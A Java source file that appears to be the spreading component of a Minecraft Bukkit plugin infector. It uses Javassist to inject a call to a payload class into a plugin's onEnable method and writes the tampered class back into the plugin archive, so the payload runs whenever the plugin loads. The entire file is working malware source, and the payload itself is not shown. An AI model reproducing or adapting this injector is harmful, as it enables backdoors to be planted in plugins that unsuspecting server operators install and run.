package com.tmquan2508.exploit.spread;

import com.tmquan2508.exploit.Exploit;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.nio.file.FileSystem;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

public final class MainClassPatcher {
    public static void hook(ClassPool pool, FileSystem outStream, String mainClass, String finalPayloadFQN) throws Exception {
        Exploit.sender.sendDebug(Level.INFO, "[+] Hooker (Javassist): Starting main class hook process.");

        CtClass ccMain = null;
        try {
            Exploit.sender.sendDebug(Level.INFO, "  |-> Getting CtClass for: " + mainClass);
            ccMain = pool.get(mainClass);

            Exploit.sender.sendDebug(Level.INFO, "  |-> Getting 'onEnable' method.");
            CtMethod onEnableMethod = ccMain.getDeclaredMethod("onEnable");

            String injectionCode = String.format("{ try { new %s((org.bukkit.plugin.Plugin)this); } catch (Throwable t) { t.printStackTrace(); } }", finalPayloadFQN);
            Exploit.sender.sendDebug(Level.FINE, "[DEBUG] Hooker: Code to be injected into onEnable(): " + injectionCode);
            onEnableMethod.insertAfter(injectionCode);

            Path mainClassPath = outStream.getPath(mainClass.replace('.', '/') + ".class");
            Exploit.sender.sendDebug(Level.INFO, "  |-> Writing modified main class back to: " + mainClassPath);
            Files.write(mainClassPath, ccMain.toBytecode(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);

            Exploit.sender.sendDebug(Level.INFO, "[+] Hooker (Javassist): Hooking process complete.");
        } finally {
            if (ccMain != null) {
                ccMain.detach();
            }
        }
    }
}